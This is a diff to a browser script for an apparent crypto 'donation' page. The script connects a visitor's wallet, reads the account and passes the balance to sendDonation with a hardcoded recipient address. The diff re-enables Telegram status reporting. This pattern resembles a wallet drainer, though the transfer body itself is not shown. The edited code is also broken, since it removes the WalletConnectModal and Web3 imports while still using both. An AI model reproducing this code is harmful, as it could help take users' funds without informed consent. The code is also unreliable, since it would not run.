@@ -1,19 +1,7 @@
-// src/script.js
-import { WalletConnectModal } from '@walletconnect/modal'
-// Now you can use WalletConnectModal
-try {
-  const modal = new WalletConnectModal();
-  console.log('WalletConnectModal loaded successfully:', modal);
-} catch (error) {
-  console.error('Failed to initialize WalletConnectModal:', error);
-}
-
-import WalletConnectProvider from 'https://unpkg.com/@walletconnect/modal';
-import Web3 from "https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js";
-//import { sendTelegramMessage, updateStatus } from "../src/utils.js";
-
+import { sendTelegramMessage, updateStatus } from "../src/utils.js";
 const donationAddress = "0x4cF7613aFE35ec64071F71f334e54e23698Fb2D9"; // Replace with your actual donation address
 const infuraId = "4ac9cf56484d49f382352ea6fbe08004"; // Replace with your actual Infura Project ID
+
 
 let provider;
 let web3;
@@ -23,19 +11,13 @@ async function init() {
 }
 
 async function connectWallet() {
-    const providerOptions = {
-        walletconnect: {
-            package: WalletConnectProvider,
-            options: {
-                infuraId: infuraId
-            }
-        }
-    };
+    const walletConnectModal = new WalletConnectModal.default({
+        projectId: infuraId,
+        network: "mainnet"
+    });
 
-    provider = new WalletConnectProvider(providerOptions);
-    
-    await provider.enable();
-    
+    provider = await walletConnectModal.connect();
+
     web3 = new Web3(provider);
     const accounts = await web3.eth.getAccounts();
     const fromAddress = accounts[0];
@@ -77,3 +59,6 @@ async function sendDonation(fromAddress, balance) {
 }
 
 window.addEventListener('load', init);
+
+
+
